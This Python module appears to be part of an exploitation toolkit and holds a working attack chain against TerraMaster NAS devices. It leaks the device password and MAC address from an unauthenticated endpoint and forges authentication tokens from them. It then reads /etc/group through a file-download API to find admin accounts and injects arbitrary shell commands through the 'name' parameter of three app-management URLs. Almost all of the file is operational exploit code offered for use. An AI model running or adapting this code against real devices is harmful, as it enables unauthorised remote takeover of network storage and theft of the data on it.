import requests, time, hashlib, os

from misc.session import *

def terramaster(ip, cmd, pwnsession):
    try:
        TARGET = None 
        MAC_ADDRESS = None
        PWD = None
        TIMESTAMP = None 

        def tos_encrypt_str(toencrypt):
            key = MAC_ADDRESS[6:] 
            return hashlib.md5(f"{key}{toencrypt}".encode("utf8")).hexdigest()

        
        def download(session, path):
            session.cookies.clear()
            cookies = {"kod_name":"guest", "kod_token":tos_encrypt_str("")}
            for name,value in cookies.items():
                session.cookies[name] = value

            r=session.post(f"http://{ip}/module/api.php?mobile/fileDownload", data={"path":path}, verify=False, timeout=(5,2), allow_redirects=False)
            #filename = os.path.basename(path)
            #if save_as is not None:
            #    filename = save_as
            #with open(filename, "wb") as file:
            #    file.write(r.content)
            return r.content

        s = pwnsession
        s.headers.update({"user-device":"TNAS", "user-agent":"TNAS"})

        r=s.post(f"http://{ip}/module/api.php?mobile/wapNasIPS", verify=False, timeout=(5,2), allow_redirects=False)
        try:
            j = r.json()
            PWD = j["data"]["PWD"]
            MAC_ADDRESS = j["data"]["ADDR"]
        except Exception:
            return False
        
        TIMESTAMP = str(int(time.time()))
        s.headers.update({"signature": tos_encrypt_str(TIMESTAMP), "timestamp": TIMESTAMP})
        s.headers.update({"authorization": PWD})

        users = None
        text = str(download(s, "/etc/group"))
        #with open("terramaster_group.txt", "r") as groups:
        for line in text.split("\\n"):
            line = line.strip()
            fields = line.split(':')
            if fields[0] == "admin":
                users = fields[3].split(",")
                break

        for admin in users:
            s.cookies.clear()
            cookies = {"kod_name": admin, "kod_token": tos_encrypt_str(PWD)}
            
            for name,value in cookies.items():
                s.cookies[name] = value
            
            for rce in [
                f'tos/index.php?app/del&id=0&name=;{cmd};xx%23',
                f'tos/index.php?app/hand_app&name=;{cmd};xx.tpk',
                f'tos/index.php?app/app_start_stop&id=ups&start=0&name=donotcare.*.oexe;{cmd};xx']:

                s.get(f'http://{ip}/{rce}', verify=False, timeout=(5,2), allow_redirects=False)

        return True
    except Exception as e: return (False, e)